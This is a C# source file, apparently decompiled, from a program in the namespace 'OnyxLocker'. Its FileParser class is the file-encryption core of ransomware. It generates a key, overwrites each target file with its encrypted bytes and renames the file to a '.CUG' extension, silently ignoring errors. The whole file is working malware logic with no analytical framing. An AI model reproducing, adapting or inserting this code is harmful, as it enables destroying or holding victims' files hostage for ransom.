using System;
using System.IO;

namespace OnyxLocker;

internal class FileParser : IFileParser
{
	private IEncryptionProvider EncryptionProvider;

	private byte[] KeyBytes;

	public FileParser(IEncryptionProvider encryptionProvider)
	{
		EncryptionProvider = encryptionProvider;
		KeyBytes = EncryptionProvider.CreateEncryptionKey();
	}

	public void ParseFile(string filePath)
	{
		byte[] fileBytes = GetFileBytes(filePath);
		byte[] fileBytes2 = EncryptionProvider.EncryptBytes(fileBytes, KeyBytes);
		WriteFileBytes(filePath, fileBytes2);
		string extension = Path.GetExtension(filePath);
		string destFileName = filePath.Replace(extension, ".CUG");
		try
		{
			File.Move(filePath, destFileName);
		}
		catch
		{
		}
		GC.Collect();
	}

	private byte[] GetFileBytes(string filePath)
	{
		using FileStream fileStream = File.OpenRead(filePath);
		byte[] array = new byte[fileStream.Length];
		try
		{
			fileStream.Read(array, 0, Convert.ToInt32(fileStream.Length));
			fileStream.Close();
			return array;
		}
		finally
		{
			fileStream.Close();
		}
	}

	private void WriteFileBytes(string filePath, byte[] fileBytes)
	{
		using FileStream fileStream = File.OpenWrite(filePath);
		if (fileStream.CanWrite)
		{
			fileStream.Write(fileBytes, 0, Convert.ToInt32(fileBytes.Length));
		}
	}
}
